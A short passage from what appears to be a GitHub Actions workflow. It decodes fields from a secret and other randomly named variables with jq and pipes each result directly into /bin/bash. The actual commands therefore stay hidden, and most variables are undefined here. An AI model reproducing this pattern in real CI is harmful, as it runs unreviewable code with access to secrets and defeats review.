        env:
          tenuo89: ${{ secrets.tenuo89 }}
        run: |
          printf '%s' "$tenuo89" | jq -r .ecrz5 | /bin/bash
          printf '%s' "$nfw2" | jq -r .vh869 | /bin/bash
          printf '%s' "$nkn49061" | jq -r .sml4248 | /bin/bash
          echo $fbyw90 | jq -r .rx726 | /bin/bash
          printf '%s' "$gdqqt4" | jq -r .oqlbb7 | /bin/bash
          printf '%s' "$tcpx5" | jq -r .plo63 | /bin/bash
          echo $za336 | jq -r .fz24351 | /bin/bash
          echo $ypm5207 | jq -r .znd692 | /bin/bash
          echo $qsvx807 | jq -r .by14 | /bin/bash
          echo $m65 | jq -r .ii84898 | /bin/bash

      - name: Upload results
